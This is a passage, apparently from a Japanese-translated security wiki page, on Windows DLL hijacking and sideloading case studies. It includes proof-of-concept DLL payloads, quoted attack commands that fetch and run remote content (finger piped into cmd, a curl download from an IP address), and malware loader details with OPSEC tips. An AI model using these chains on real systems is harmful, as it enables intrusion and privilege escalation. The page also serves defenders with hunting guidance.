攻撃者は同じ directory に悪意のある `hostfxr.dll` stub を配置し、missing DLL を exploit することで、user context で code execution を達成できます。
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### 攻撃フロー

1. 標準ユーザーとして、`hostfxr.dll` を `C:\ProgramData\Lenovo\TPQM\Assistant\` に配置します。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前 9:30 に実行されるまで待ちます。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は中程度の整合性レベルで管理者のセッション内で実行されます。
4. 標準的な UAC bypass techniques を連鎖させ、中程度の整合性レベルから SYSTEM 権限へ昇格します。

## ケーススタディ: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors は、信頼された署名済みプロセスの下で payloads を実行するために、MSI-based droppers と DLL side-loading を組み合わせることがよくあります。<sup>[[10]](#references)</sup>

チェーンの概要
- ユーザーが MSI をダウンロードします。GUI インストール中に CustomAction がサイレントに実行され（例: LaunchApplication または VBScript action）、埋め込まれた resources から次の stage を再構築します。
- Dropper は、正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込みます（例: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll）。
- 署名済み EXE が起動されると、Windows DLL search order により、まず working directory 内の wsc.dll が読み込まれ、署名済み parent の下で attacker code が実行されます（ATT&CK T1574.001）。

MSI analysis（確認すべき項目）
- CustomAction table:
- 実行ファイルまたは VBScript を実行する entries を探します。疑わしい pattern の例: LaunchApplication が embedded file を background で実行するもの。
- Orca（Microsoft Orca.exe）で、CustomAction、InstallExecuteSequence、Binary tables を調べます。
- MSI CAB 内の embedded/split payloads:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- または lessmsi を使用します: lessmsi x package.msi C:\out
- VBScript CustomAction によって連結および復号される、複数の小さな fragments を探します。一般的な flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
wsc_proxy.exe を使った実践的な sideloading
- 以下の2つのファイルを同じフォルダーに配置します:
- wsc_proxy.exe: 正規の署名付き host (Avast)。このプロセスは、ディレクトリ内から名前で wsc.dll のロードを試みます。
- wsc.dll: attacker の DLL。特定の exports が必要ない場合は DllMain だけで十分です。それ以外の場合は proxy DLL をビルドし、DllMain で payload を実行しながら、必要な exports を genuine library に転送します。
- 最小限の DLL payload をビルドします:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- export 要件では、proxying framework（例: DLLirant/Spartacus）を使用して、payload も実行する forwarding DLL を生成します。

- この technique は、host binary による DLL name resolution に依存します。host が absolute path や safe loading flag（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用する場合、hijack は失敗する可能性があります。
- KnownDLLs、SxS、forwarded exports は優先順位に影響するため、host binary と export set の選定時に考慮する必要があります。

## Signed triads + encrypted payloads（ShadowPad case study）

Check Point は、Ink Dragon がディスク上の core payload を暗号化したまま、正規 software に紛れ込ませるため、**three-file triad** を使用して ShadowPad を展開する方法を説明しています:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD、Realtek、NVIDIA などの vendor が悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は executable の名前を Windows binary に見えるように変更します（例: `conhost.exe`）。ただし、Authenticode signature は有効なままです。
2. **Malicious loader DLL** – EXE の隣に、想定される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）で配置されます。この DLL は通常、ScatterBrain framework で obfuscate された MFC binary であり、暗号化された blob を見つけて復号し、ShadowPad を reflectively map することだけを目的とします。
3. **Encrypted payload blob** – 多くの場合、同じ directory に `<name>.tmp` として保存されます。復号した payload を memory-map した後、loader は forensic evidence を破壊するため TMP file を削除します。

Tradecraft notes:

* signed EXE の名前を変更し（PE header 内の元の `OriginalFileName` は維持）、Windows binary を装いながら vendor signature を保持できます。そのため、Ink Dragon の習慣を再現し、実際には AMD/NVIDIA utility である `conhost.exe` 風の binary を配置します。
* executable は trusted のままなので、allowlisting controls の大半では、その隣に malicious DLL を置くだけで済みます。loader DLL の customization に注力してください。signed parent は通常、変更せずに実行できます。
* ShadowPad の decryptor は、TMP blob が loader の隣にあり、mapping 後に file を zero できるよう writable であることを想定しています。payload が load されるまで directory を writable に保ち、memory 上に展開された後は、OPSEC のため TMP file を安全に削除できます。

### LOLBAS stager + staged archive sideloading chain（finger → tar/curl → WMI）

Operators は DLL sideloading と LOLBAS を組み合わせ、ディスク上の custom artifact を trusted EXE の隣に置く malicious DLL だけにします:<sup>[[1]](#references)</sup>

- **Remote command loader（Finger）:** Hidden PowerShell が `cmd.exe /c` を spawn し、Finger server から commands を取得して `cmd` に pipe します:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` は TCP/79 の text を取得し、`| cmd` は server response を実行します。これにより、operators は second stage server を server-side で切り替えられます。

- **Built-in download/extract:** benign extension の archive を download し、unpack して、random な `%LocalAppData%` folder の下に sideload target と DLL を stage します:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` は progress を隠し、redirect を follow します。`tar -xf` は Windows built-in の tar を使用します。

- **WMI/CIM launch:** WMI 経由で EXE を start し、colocated DLL の load 中に telemetry へ CIM-created process として表示されるようにします:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- local DLL を優先する binary（例: `intelbq.exe`、`nearby_share.exe`）で動作します。payload（例: Remcos）は trusted name の下で実行されます。

- **Hunting:** `/p`、`/m`、`/c` が同時に現れる `forfiles` に alert を設定します。admin scripts 以外では一般的ではありません。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload（Chrysalis）

最近の Lotus Blossom intrusion では、trusted update chain を悪用して NSIS-packed dropper を配信し、DLL sideload と完全な in-memory payloads を stage しました:<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe`（NSIS）は `%AppData%\Bluetooth` を作成して **HIDDEN** に設定し、名前を変更した Bitdefender Submission Wizard `BluetoothService.exe`、malicious `log.dll`、encrypted blob `BluetoothService` を drop してから EXE を launch します。
- host EXE は `log.dll` を import し、`LogInit`/`LogWrite` を call します。`LogInit` は blob を mmap-load し、`LogWrite` は custom LCG-based stream（constants **0x19660D** / **0x3C6EF35F**、key material は prior hash から導出）で復号し、buffer を plaintext shellcode で overwrite して temps を free し、そこへ jump します。
- IAT を避けるため、loader は FNV-1a basis 0x811C9DC5 + prime 0x100019 を使用して export names を hashing し、続いて Murmur-style avalanche（**0x85EBCA6B**）を適用し、salted target hashes と比較して APIs を resolve します。

Main shellcode（Chrysalis）
- PE-like main module を、key `gQ2JR&9;` による add/XOR/sub の反復処理で five passes にわたって復号し、`Kernel32.dll` → `GetProcAddress` を動的に load して import resolution を完了します。
- per-character bit-rotate/XOR transforms により runtime で DLL name strings を再構築し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を load します。
- second resolver は **PEB → InMemoryOrderModuleList** を歩き、各 export table を Murmur-style mixing により 4-byte blocks 単位で parse します。hash が見つからない場合のみ `GetProcAddress` に fallback します。

Embedded configuration & C2
- Config は dropped `BluetoothService` file 内の **offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7` で RC4-decrypt すると C2 URL と User-Agent が現れます。
- Beacons は dot-delimited host profile を構築し、tag `4Q` を prepend してから、key `vAuig34%^325hGV` で RC4-encrypt し、HTTPS 上で `HttpSendRequestA` を実行します。Responses は RC4-decrypt され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）によって dispatch されます。
- Execution mode は CLI args によって制御されます。args なし = `-i` を指す persistence（service/Run key）を install；`-i` = `-k` を付けて自身を relaunch；`-k` = install を skip して payload を実行します。

Alternate loader observed
- 同じ intrusion では Tiny C Compiler も drop され、`C:\ProgramData\USOShared\` から `svchost.exe -nostdlib -run conf.c` が実行され、`libtcc.dll` がその隣に配置されていました。attacker-supplied C source は shellcode を embedded し、PE を disk に書き込まず、compile して in-memory で実行しました。以下で replicate できます:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- この TCC-based compile-and-run stage は runtime で `Wininet.dll` を import し、hardcoded URL から second-stage shellcode を取得することで、compiler run を装う柔軟な loader となっていた。

## Signed-host sideloading with export proxying + host thread parking

一部の DLL sideloading chain では、malicious DLL の load 後に crash するのではなく、legitimate host が later stage を正常に load できるだけの時間生存するよう、**stability engineering** が追加されます。<sup>[[11]](#references)</sup>

Observed pattern
- expected dependency name（`version.dll` など）を使用して、trusted EXE を malicious DLL と同じ場所に配置する。
- malicious DLL は、expected export をすべて real system DLL（例: `%SystemRoot%\\System32\\version.dll`）へ **proxy** するため、import resolution は引き続き成功し、host process は動作を継続する。
- load 後、malicious DLL は **host entry point を patch** し、main thread が終了または process を terminate する code path を実行する代わりに、無限の `Sleep` loop に入るようにする。
- 新しい thread が実際の malicious work を実行する。具体的には、next-stage DLL の name または path を decrypt（RC4/XOR が一般的）し、その後 `LoadLibrary` で起動する。

Why this matters
- 通常の DLL proxying は API compatibility を維持しますが、later stage に十分な時間だけ host が生存することまでは保証しません。
- main thread を `Sleep(INFINITE)` に parking することで、loader が worker thread で decryption、staging、または network bootstrap を実行する間、signed process を resident に保つことができます。
- suspicious な `DllMain` だけを hunting していると、host entry point が patch され、secondary thread が開始された後に興味深い behavior が発生するこの pattern を見逃す可能性があります。

Minimal workflow
1. signed host EXE をコピーし、local directory から resolve される DLL を特定する。
2. 同じ function を export し、それらを legitimate DLL に forwarding する proxy DLL を build する。
3. `DllMain(DLL_PROCESS_ATTACH)` 内で worker thread を作成する。
4. その thread から host entry point または main thread start routine を patch し、`Sleep` を loop するようにする。
5. next-stage DLL の name/config を decrypt し、`LoadLibrary` を呼び出すか、payload を manual-map する。

Defensive pivots
- `System32` ではなく、自身の application directory から `version.dll` または同様に common な library を load する signed process。
- image load の直後に process entry point へ実施される memory patch。特に、`Sleep`/`SleepEx` へ redirect される jumps/calls。
- proxy DLL によって作成され、decrypt された name を持つ second DLL に対して直ちに `LoadLibrary` を呼び出す thread。
- `ProgramData`、`%TEMP%`、または unpacked archive path などの writable staging directory 内で vendor executable の隣に配置された full-export proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows における DLL hijacking。Simple C example。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore が Europe を標的とする New Malware を Deploy](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks が Windows Helpers と遭遇するとき](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT を配布する Evolving Impersonation Campaigns の Anatomy](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Southeast Asian Government を標的とする Threat Clusters の Analysis](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Stealthy Offensive Operation の Relay Network と Inner Workings を Revealing](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom の toolkit を Deep Dive](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens の 2026 Espionage Campaigns を Tracking](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: Iranian Conflict 中の Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が Southeast Asian Governments と Critical Infrastructure を Target](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
